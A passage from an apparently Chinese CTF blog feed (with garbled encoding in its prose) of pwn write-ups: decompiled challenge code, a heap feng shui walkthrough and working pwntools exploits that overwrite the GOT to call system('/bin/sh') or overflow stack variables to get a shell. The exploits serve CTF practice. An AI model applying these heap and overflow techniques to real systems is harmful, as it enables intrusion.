class="line">sl(payload)</span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;opt:2\nmsg:&#x27;</span>+amd64shell+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">ru(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åˆ·é¢˜è®°å½•2&quot;&gt;&lt;a href=&quot;#åˆ·é¢˜è®°å½•2&quot; class=&quot;headerlink&quot; title=&quot;åˆ·é¢˜è®°å½•2&quot;&gt;&lt;/a&gt;åˆ·é¢˜è®°å½•2&lt;/h1&gt;&lt;h1 id=&quot;LitCTF-2023-ezlogin&quot;&gt;&lt;a href=&quot;#LitCTF-2023-ezlogin&quot; c</summary>
      
    
    
    
    <category term="åšé¢˜è®°å½•" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>é¢˜å½•1.0</title>
    <link href="http://s1nec-1o.github.io/2024/05/12/%E9%A2%98%E5%BD%951-0/"/>
    <id>http://s1nec-1o.github.io/2024/05/12/%E9%A2%98%E5%BD%951-0/</id>
    <published>2024-05-12T08:48:29.000Z</published>
    <updated>2024-05-12T08:53:49.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åˆ·é¢˜è®°å½•1"><a href="#åˆ·é¢˜è®°å½•1" class="headerlink" title="åˆ·é¢˜è®°å½•1"></a>åˆ·é¢˜è®°å½•1</h1><p>å› ä¸ºå›½èµ›å°†è¿‘ï¼Œå¼€å§‹æ¯å¤©å‡ é“é¢˜ï¼Œéš¾åº¦ä¸ç­‰ï¼Œä¹‹åä¼šæœ‰patchçš„ä½¿ç”¨ï¼ˆç®—æ˜¯é¢„å‘Šå’ŒDIR-815çš„å¤ç°ï¼ˆæ—©å°±å¤ç°ä¸€ç›´æ²¡æ—¶é—´è¯¦ç»†å†™</p><h1 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653175.png" alt="image-20240507223850443"></p><p>æ˜¯ä¸€é“é£æ°´é¢˜ï¼Œå¯ä»¥æ‹¿æ¥æ‰¾å›æ„Ÿè§‰</p><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> v2[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, v2, &amp;v0);</span><br><span class="line">      add(v2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">      delete(LOBYTE(v2[<span class="number">0</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">      show(v2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">      edit(v2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)byte_804B069 &gt; <span class="number">0x31</span>u )<span class="comment">// æœ‰é™åˆ¶</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§„çš„èœå•å †</p><p>å¯ä»¥åˆ†æå‡ºä¸€ä¸ªç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* description;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x7f</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»–æ˜¯é¦–å…ˆä¼šmallocä¸€ä¸ªå †ä½œä¸ºå­˜å‚¨desï¼Œç„¶åå†malloc 0x80æ¥å­˜å‚¨nameå’Œdeså †çš„åœ°å€</p><p>ä¸»è¦çš„æ¼æ´ç‚¹åœ¨äºeditå‡½æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_8048724</span><span class="params">(<span class="type">unsigned</span> __int8 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; (<span class="type">unsigned</span> __int8)byte_804B069 &amp;&amp; *(&amp;ptr + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v3, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="type">char</span> *)*(&amp;ptr + a1) - <span class="number">4</span> )<span class="comment">// ä¿è¯desçš„heapåœ°å€å°äºæ€»heapåœ°å€</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    fgets_1(*(<span class="type">char</span> **)*(&amp;ptr + a1), v3 + <span class="number">1</span>);    <span class="comment">// v3å¯æ”¹è¯´æ˜å †æº¢å‡ºï¼Œä½†æ˜¯è¦ç»•è¿‡ä¸Šè¿°çš„if</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»–çš„æ•°æ®åˆ¤æ–­ä¸»è¦æ˜¯é€šè¿‡åœ°å€çš„åˆ¤æ–­</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>1.é¦–å…ˆç”³è¯·è¿ç»­çš„3ä¸ªç»“æ„ä½“ï¼Œdescriptionéƒ¨åˆ†ç©ºé—´å¤§å°ä¸º0x80ï¼Œæ–¹ä¾¿è®¡ç®—ï¼š</p><table><thead><tr><th>å †å—0 des 0x80</th><th>å †å—0 node 0x80</th><th>å †å—1 des 0x80</th><th>å †å—1 node 0x80</th><th>å †å—2 des 0x8</th><th>å †å—2 node 0x80</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>2.é‡Šæ”¾ç¬¬ä¸€ä¸ªç»“æ„ä½“ï¼Œå¾—åˆ°ä¸€ä¸ªç©ºé—²çš„0x100çš„å †å—ï¼š</p><table><thead><tr><th>ç©ºé—²å †å—0 x100</th><th>å †å—1 des 0x80</th><th>å †å—1 node 0x80</th><th>å †å—2 des 0x8</th><th>å †å—2 node 0x80</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>3.ç”³è¯·æ–°çš„ç»“æ„ä½“ï¼Œå…¶descriptionéƒ¨åˆ†ä¸º0x100ï¼Œæ ¹æ®linuxå †çš„æ€§è´¨ï¼Œä¼šä¼˜å…ˆåˆ†é…ç©ºé—²çš„å †å—ï¼Œé‡Šæ”¾å¾—åˆ°çš„ç©ºé—²å †å—å¯ä»¥æ»¡è¶³descriptionçš„ç©ºé—´éœ€æ±‚ï¼Œè€Œnodeçš„ç©ºé—´éœ€è¦æ–°åˆ†é…ï¼Œå¾—åˆ°ä¸‹é¢çš„ç»“æ„ï¼š</p><table><thead><tr><th align="right">å †å—0 des 0x100</th><th>å †å—1 des 0x80</th><th>å †å—1 node 0x80</th><th>å †å—2 des 0x8</th><th>å †å—2 node 0x80</th><th>å †å—0 node 0x80</th></tr></thead><tbody><tr><td align="right"></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>ä¹‹åç»•è¿‡åªéœ€è¦desçš„å¤§å°è¾“å…¥ä¸­é—´è·¨è¿‡çš„å †çš„å¤§å°å°±èƒ½å®ç°å †æº¢å‡ºäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;./babyfengshui_1&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28996</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, length, text=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size of description: &#x27;</span>,tbs(size))</span><br><span class="line">    sla(<span class="string">&#x27;name: &#x27;</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;text length: &#x27;</span>,tbs(length))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, length, text</span>):</span><br><span class="line">    sla(<span class="string">&quot;Action: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,tbs(index))</span><br><span class="line">    sla(<span class="string">&#x27;length: &#x27;</span>,tbs(length))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">0x8</span>, <span class="number">0x8</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x19c</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr=u32(r(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">f&quot;free_addr==&gt;<span class="subst">&#123;<span class="built_in">hex</span>(free_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">f&quot;system_addr===&gt;<span class="subst">&#123;<span class="built_in">hex</span>(sys_addr)&#125;</span>&quot;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x4</span>,p32(sys_addr))</span><br><span class="line">debug()</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>è‡³å°‘æœ¬åœ°é€šäº†ï¼ˆæ±—ï¼Œè¿œç¨‹å¤ªoldäº†</p><h1 id="æŠ¤ç½‘æ¯-2018-gettingstart"><a href="#æŠ¤ç½‘æ¯-2018-gettingstart" class="headerlink" title="æŠ¤ç½‘æ¯_2018_gettingstart"></a>æŠ¤ç½‘æ¯_2018_gettingstart</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">double</span> v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v5 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v6 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;HuWangBei CTF 2018 will be getting start after %lu seconds...\n&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But Whether it starts depends on you.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0x7FFFFFFFFFFFFFFF</span>LL &amp;&amp; v6 == <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HuWangBei CTF 2018 will be getting start after %g seconds...\n&quot;</span>, v6);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®—æ˜¯ä¸€ä¸ªè¶£å‘³é¢˜ï¼Œæ˜¯è¦†ç›–v5ä¸º7FFFâ€¦FFFç„¶åè¦†ç›–v6ä¸º0.1å°±å¯ä»¥getshellï¼Œä¸»è¦æ˜¯v6çš„doubleå‹è½¬æ¢æ¯”è¾ƒå¤æ‚ï¼ˆåƒä¸‡ä¸è¦ç”¨gptåšè¿™ç§å·¥ä½œã€‚ã€‚ã€‚ã€‚ã€‚</p><p>æµ®ç‚¹å‹ï¼š<a href="https://tooltt.com/floatconverter/">https://tooltt.com/floatconverter/</a></p><p>å°±æœ‰expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">path=<span class="string">&#x27;start&#x27;</span></span><br><span class="line">p=process(path)</span><br><span class="line"></span><br><span class="line">pay=<span class="number">0x18</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="number">0x3FB999999999999A</span>) </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;But Whether it starts depends on you.\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653176.png" alt="image-20240508185905256" style="zoom:50%;" /><p>æ»¡ä¿æŠ¤</p><h2 id="é™æ€åˆ†æ-1"><a href="#é™æ€åˆ†æ-1" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  banner();                                     <span class="comment">// æœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;None!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No such choices!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸€ä¸ªèœå•å †</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title 